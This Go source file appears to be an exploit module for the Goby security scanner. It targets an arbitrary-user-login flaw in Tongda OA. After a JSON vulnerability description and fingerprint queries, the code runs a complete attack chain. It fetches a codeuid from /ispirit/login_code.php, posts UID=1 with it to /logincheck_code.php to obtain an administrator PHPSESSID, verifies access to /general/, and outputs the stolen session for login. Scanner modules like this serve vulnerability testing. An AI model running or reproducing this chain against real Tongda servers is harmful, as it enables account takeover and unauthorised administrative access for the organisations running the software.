package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Tongda OA Arbitrary User Login Vulnerability",
    "Description": "<p>Tongda OA (Office Anywhere Network Intelligent Office System) is a collaborative office automation software independently developed by Beijing Tongda Xinke Technology Co., Ltd. It is a comprehensive management office platform formed by combining with Chinese enterprise management practices.</p><p>Tongda has an arbitrary user login vulnerability. An attacker can log in to any user through the specified interface, obtain background management permissions, and directly log in to the background for sensitive operations.</p>",
    "Impact": "Tongda OA Arbitrary User Login Vulnerability",
    "Recommendation": "<p><a href=\"https://www.tongda2000.com/\">Please follow the manufacturer's website to update it in time. https://www.tongda2000.com/</a></p>",
    "Product": "Tongda-OA",
    "VulType": [
        "Permission Bypass"
    ],
    "Tags": [
        "Permission Bypass"
    ],
    "Translation": {
        "CN": {
            "Name": "通达 OA 任意用户登陆漏洞",
            "Description": "<p>通达OA（Office Anywhere网络智能办公系统）是由北京通达信科科技有限公司自主研发的协同办公自动化软件，是与中国企业管理实践相结合形成的综合管理办公平台。<br></p><p>通达存在任意用户登陆漏洞，攻击者可以通过指定接口登陆任意用户，获取后台管理权限，直接登录后台进行敏感操作。</p>",
            "Impact": "<p><span style=\"color: rgb(22, 28, 37); font-size: 16px;\">通达存在任意用户登陆漏洞，攻击者可以通过指定接口登陆任意用户，获取后台管理权限，直接登录后台进行敏感操作。</span><br></p>",
            "Recommendation": "<p>请联系官方厂商进行更新。<a href=\"https://www.tongda2000.com/\" target=\"_blank\">https://www.tongda2000.com/</a><br></p>",
            "Product": "通达-OA",
            "VulType": [
                "权限绕过"
            ],
            "Tags": [
                "权限绕过"
            ]
        },
        "EN": {
            "Name": "Tongda OA Arbitrary User Login Vulnerability",
            "Description": "<p><span style=\"color: var(--primaryFont-color);\">Tongda OA (Office Anywhere Network Intelligent Office System) is a collaborative office automation software independently developed by Beijing Tongda Xinke Technology Co., Ltd. It is a comprehensive management office platform formed by combining with Chinese enterprise management practices.</span><br></p><p><span style=\"color: rgb(22, 51, 102); font-size: 16px;\"></span><span style=\"color: rgb(0, 0, 0); font-size: 16px;\">Tongda has an arbitrary user login vulnerability. An attacker can log in to any user through the specified interface, obtain background management permissions, and directly log in to the background for sensitive operations.</span><br></p>",
            "Impact": "Tongda OA Arbitrary User Login Vulnerability",
            "Recommendation": "<p><span style=\"color: rgb(22, 51, 102); font-size: 16px;\"></span><a href=\"https://www.tongda2000.com/\" target=\"_blank\"><span style=\"color: rgb(0, 0, 0); font-size: 16px;\">Please follow the manufacturer's website to update it in time.&nbsp;</span>https://www.tongda2000.com/</a><br></p>",
            "Product": "Tongda-OA",
            "VulType": [
                "Permission Bypass"
            ],
            "Tags": [
                "Permission Bypass"
            ]
        }
    },
    "FofaQuery": "body=\"/static/templates/2013_01/index.css/\" || body=\"javascript:document.form1.UNAME.focus()\" || body=\"href=\\\"/static/images/tongda.ico\\\"\" || body=\"<link rel=\\\"shortcut icon\\\" href=\\\"/images/tongda.ico\\\" />\" || (body=\"OA提示：不能登录OA\" && body=\"紧急通知：今日10点停电\") || title=\"Office Anywhere 2013\" || title=\"Office Anywhere 2015\" || (body=\"tongda.ico\" && (title=\"OA\" || title=\"办公\")) || body=\"class=\\\"STYLE1\\\">新OA办公系统\"",
    "GobyQuery": "body=\"/static/templates/2013_01/index.css/\" || body=\"javascript:document.form1.UNAME.focus()\" || body=\"href=\\\"/static/images/tongda.ico\\\"\" || body=\"<link rel=\\\"shortcut icon\\\" href=\\\"/images/tongda.ico\\\" />\" || (body=\"OA提示：不能登录OA\" && body=\"紧急通知：今日10点停电\") || title=\"Office Anywhere 2013\" || title=\"Office Anywhere 2015\" || (body=\"tongda.ico\" && (title=\"OA\" || title=\"办公\")) || body=\"class=\\\"STYLE1\\\">新OA办公系统\"",
    "Author": "su18@javaweb.org",
    "Homepage": "https://www.tongda2000.com/",
    "DisclosureDate": "2021-05-20",
    "References": [
        "https://fofa.so/"
    ],
    "HasExp": true,
    "Is0day": true,
    "Level": "3",
    "CVSS": "9.0",
    "CVEIDs": [],
    "CNVD": [],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10481"
}`

	checkIsTongdaOA1231234 := func(host *httpclient.FixUrl) bool {
		requestConfig := httpclient.NewGetRequestConfig("/inc/expired.php")
		requestConfig.VerifyTls = false
		requestConfig.FollowRedirect = false
		if resp, err := httpclient.DoHttpRequest(host, requestConfig); err == nil {
			return resp.StatusCode == 200 && strings.Contains(resp.RawBody, "tongda")
		}
		return false
	}
	getTongdaCodeUID435345 := func(host *httpclient.FixUrl) string {
		requestConfig := httpclient.NewGetRequestConfig("/ispirit/login_code.php")
		requestConfig.VerifyTls = false
		requestConfig.FollowRedirect = false
		if resp, err := httpclient.DoHttpRequest(host, requestConfig); err == nil {
			if resp.StatusCode == 200 && strings.Contains(resp.RawBody, "\"codeuid\"") {
				return regexp.MustCompile(`\{"codeuid":"\{(.*?)}"`).FindStringSubmatch(resp.RawBody)[1]
			}
		}
		return ""
	}
	getTongdaPHPSESSID4564234 := func(codeuid string, host *httpclient.FixUrl) string {
		requestConfig := httpclient.NewPostRequestConfig("/logincheck_code.php")
		requestConfig.VerifyTls = false
		requestConfig.FollowRedirect = false
		requestConfig.Header.Store("Content-type", "application/x-www-form-urlencoded")
		requestConfig.Data = "UID=1&CODEUID=_PC{" + codeuid + "}"
		if resp, err := httpclient.DoHttpRequest(host, requestConfig); err == nil {
			if resp.StatusCode == 200 && strings.Contains(resp.RawBody, "\"status\":1") && strings.Contains(resp.RawBody, "\"url\":\"general") && strings.Contains(resp.HeaderString.String(), "Set-Cookie: PHPSESSID=") {
				return regexp.MustCompile(`Set-Cookie: PHPSESSID=(.*?);`).FindStringSubmatch(resp.HeaderString.String())[1]
			}
		}
		return ""
	}
	exploitTongda45321 := func(phpsessionid string, host *httpclient.FixUrl) bool {
		requestConfig := httpclient.NewGetRequestConfig("/general/")
		requestConfig.VerifyTls = false
		requestConfig.FollowRedirect = false
		requestConfig.Timeout = 15
		requestConfig.Header.Store("Cookie", "PHPSESSID="+phpsessionid)
		if resp, err := httpclient.DoHttpRequest(host, requestConfig); err == nil {
			return resp.StatusCode == 302 && strings.Contains(resp.Utf8Html, "tongdainfo")
		}
		return false
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			if checkIsTongdaOA1231234(u) {
				codeuid := getTongdaCodeUID435345(u)
				if codeuid != "" {
					phpsessionid := getTongdaPHPSESSID4564234(codeuid, u)
					if phpsessionid != "" {
						return exploitTongda45321(phpsessionid, u)
					}
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			if checkIsTongdaOA1231234(expResult.HostInfo) {
				codeuid := getTongdaCodeUID435345(expResult.HostInfo)
				if codeuid != "" {
					phpsessionid := getTongdaPHPSESSID4564234(codeuid, expResult.HostInfo)
					if phpsessionid != "" {
						if exploitTongda45321(phpsessionid, expResult.HostInfo) {
							expResult.Success = true
							expResult.Output = "登陆成功，使用如下 session 即可登陆：" + phpsessionid
						}
					}
				}
			}
			return expResult
		},
	))
}
